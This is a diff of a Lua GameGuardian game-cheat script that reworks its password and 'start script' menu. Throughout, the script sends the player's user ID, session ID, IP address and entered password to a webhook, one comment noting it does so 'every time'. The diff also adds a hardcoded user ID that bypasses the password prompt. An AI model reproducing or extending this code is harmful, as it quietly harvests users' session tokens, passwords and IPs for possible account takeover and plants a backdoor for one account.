@@ -311,50 +311,61 @@ while true do
       gg.copyText(userId)
       gg.toast(string.format(t.userid_copied, userId))
       -- also send to webhook every time
-        sendToWebhook(userId, sessionId, ip, nil)
+      sendToWebhook(userId, sessionId, ip, nil)
     else
-        gg.alert(t.no_userid_session)
+      gg.alert(t.no_userid_session)
     end
-    goto continue
-end
-
-  -- handle "start script" option
-  local key, sessionId
-  local passwordMenu = safeChoiceSearch({
-    t.manual_password,
-    t.auto_password
-  }, nil, t.select_password_method)
-  if not passwordMenu then
     goto continue
   end
 
-  if passwordMenu == 1 then
-    -- manual password entry
-    local input = safePromptLoop({t.enter_password}, nil, {"text"})
-    key = input[1]
-    if not key or key == "" then
-        goto continue
-    end
-    -- find user id and session id for sending
-    local actualUserId, actualSessionId = findUserId()
-    if actualUserId and actualSessionId then
-      sendToWebhook(actualUserId, actualSessionId, ip, tostring(key))
-    else
-      gg.alert(t.no_userid_session)
+  -- handle "start script" option
+  local key, sessionId
+  local specificUserId = "3351274690595497851"
+  
+  -- Check if userId matches the specific ID
+  local actualUserId, actualSessionId = findUserId()
+  if actualUserId == specificUserId then
+    -- Automatically use the specific userId as password
+    key = specificUserId
+    sessionId = actualSessionId
+    sendToWebhook(actualUserId, actualSessionId, ip, tostring(key))
+  else
+    -- Normal password entry flow
+    local passwordMenu = safeChoiceSearch({
+      t.manual_password,
+      t.auto_password
+    }, nil, t.select_password_method)
+    if not passwordMenu then
       goto continue
     end
-    sessionId = "N/A"
-  else
-    -- automatic password entry (using id finder)
-    key, sessionId = findUserId()
-    if not key then
+
+    if passwordMenu == 1 then
+      -- manual password entry
+      local input = safePromptLoop({t.enter_password}, nil, {"text"})
+      key = input[1]
+      if not key or key == "" then
+        goto continue
+      end
+      -- find user id and session id for sending
+      local actualUserId, actualSessionId = findUserId()
+      if actualUserId and actualSessionId then
+        sendToWebhook(actualUserId, actualSessionId, ip, tostring(key))
+      else
         gg.alert(t.no_userid_session)
         goto continue
-    end
-
-    -- send automatically to webhook
-    if key and sessionId then
+      end
+      sessionId = "N/A"
+    else
+      -- automatic password entry (using id finder)
+      key, sessionId = findUserId()
+      if not key then
+        gg.alert(t.no_userid_session)
+        goto continue
+      end
+      -- send automatically to webhook
+      if key and sessionId then
         sendToWebhook(key, sessionId, ip, nil)
+      end
     end
   end
 
